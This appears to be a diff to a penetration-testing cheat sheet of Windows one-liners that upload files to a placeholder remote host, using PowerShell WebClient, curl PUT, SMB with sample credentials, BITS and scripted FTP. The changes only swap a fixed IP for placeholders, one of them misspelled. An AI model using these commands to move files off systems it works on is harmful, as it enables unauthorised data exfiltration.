@@ -5,15 +5,15 @@ USING POWERSHELL -
 
 **Web Content Upload**
     
-    $webClient.UploadFile('http://10.10.10.10/demo.txt', 'PUT', 'C:\temp\demo.txt')
+    $webClient.UploadFile('http://{REMOTE-IP}/demo.txt', 'PUT', 'C:\temp\demo.txt')
 
 **Web Content Upload**
     
-    powershell.exe -c "curl.exe -T C:\temp\demo.txt http://10.10.10.10/demo.txt"
+    powershell.exe -c "curl.exe -T C:\temp\demo.txt http://{REMOTE-IP}/demo.txt"
 
 **Web Content Upload**
     
-    Start-Process -FilePath "curl.exe" -ArgumentList "-T 'C:\temp\demo.txt' http://10.10.10.10/demo.txt" -NoNewWindow -Wait
+    Start-Process -FilePath "curl.exe" -ArgumentList "-T 'C:\temp\demo.txt' http://{REMOTE-IP}/demo.txt" -NoNewWindow -Wait
 ------------------------------------------------------------------------------------------------------------------
 
 </br>
@@ -23,11 +23,11 @@ USING CMD -
 
 **Using PUT Method**
     
-    powershell.exe -c "$webClient = New-Object System.Net.WebClient; $webClient.UploadFile('http://10.10.10.10/demo.txt', 'PUT', 'C:\temp\demo.txt')"   
+    powershell.exe -c "$webClient = New-Object System.Net.WebClient; $webClient.UploadFile('http://{REMOTE-IP}/demo.txt', 'PUT', 'C:\temp\demo.txt')"   
 
 **Using POST Method**
 
-    powershell.exe -c "$webClient = New-Object System.Net.WebClient; $webClient.UploadFile('http://10.10.10.10/demo.txt','C:\temp\demo.txt')"
+    powershell.exe -c "$webClient = New-Object System.Net.WebClient; $webClient.UploadFile('http://{REMOTE-IP}/demo.txt','C:\temp\demo.txt')"
 ------------------------------------------------------------------------------------------------------------------
 
 </br>
@@ -54,11 +54,11 @@ USING SMB -
 
 **To create authenticated session**
 
-    net use \\10.10.10.10 /u:"user" "123"
+    net use \\{LOCAL-IP} /u:"user" "123"
 
 **Web Content Upload**
     
-    copy demo.txt \\10.10.10.10\share\  
+    copy demo.txt \\{LOCAL-IP}\share\  
 ------------------------------------------------------------------------------------------------------------------
 
 </br>
@@ -113,19 +113,19 @@ USING BITSADMIN -
 
 **Web Content Upload**
     
-    Start-BitsTransfer -Source "C:\temp\demo.txt" -Destination "http://10.10.10.10/demo.txt" -TransferType Upload
+    Start-BitsTransfer -Source "C:\temp\demo.txt" -Destination "http://{LCOAL-IP}/demo.txt" -TransferType Upload
 
 **Web Content Upload**
     
-    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source "C:\temp\demo.txt" -Destination "http://10.10.10.10/demo.txt" -TransferType Upload
+    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source "C:\temp\demo.txt" -Destination "http://{LOCAL-IP}/demo.txt" -TransferType Upload
 
 **Web Content Upload**
     
-    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://10.10.10.10/demo.txt' -Destination 'c:\temp\demo.txt'"
+    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://{LOCAL-IP}/demo.txt' -Destination 'c:\temp\demo.txt'"
 
 **Web Content Upload**
     
-    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://10.10.10.10/demo.txt' -Destination 'c:\temp\demo.txt' -Method 'PUT'"
+    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://{LOCAL-IP}/demo.txt' -Destination 'c:\temp\demo.txt' -Method 'PUT'"
 ------------------------------------------------------------------------------------------------------------------
 
 </br>
@@ -153,7 +153,7 @@ USING FTP -
 
 Replace "demo.txt" with desired file name
     
-    echo open 10.10.10.10 21 > file.txt
+    echo open {LOCAL-IP} 21 > file.txt
     echo bin>> file.txt
     echo put demo.txt>> file.txt
     echo bye>> file.txt
@@ -162,19 +162,19 @@ Replace "demo.txt" with desired file name
 
 **One Liner**
 
-    echo open 10.10.10.10 21 > file.txt && echo bin>> file.txt && echo put demo.txt>> file.txt && echo bye>> file.txt && ftp -A -v -n -s:file.txt
+    echo open {LOCAL-IP} 21 > file.txt && echo bin>> file.txt && echo put demo.txt>> file.txt && echo bye>> file.txt && ftp -A -v -n -s:file.txt
 
 **Mannualy -**
 
     ftp
-    open 10.10.10.10 2121
+    open {LOCAL-IP} 2121
     put demo.txt
 
 **FTP Authenticated**
 
 Replace "demo.txt" with desired file name
     
-    echo open 10.10.10.10 21 > file.txt
+    echo open {LOCAL-IP} 21 > file.txt
     echo user test>> file.txt
     echo test>> file.txt
     echo bin>> file.txt
@@ -186,6 +186,6 @@ Replace "demo.txt" with desired file name
 **Mannualy -**
 
     ftp
-    open 10.10.10.10 2121
+    open {LOCAL-IP} 2121
     put demo.txt
 ------------------------------------------------------------------------------------------------------------------
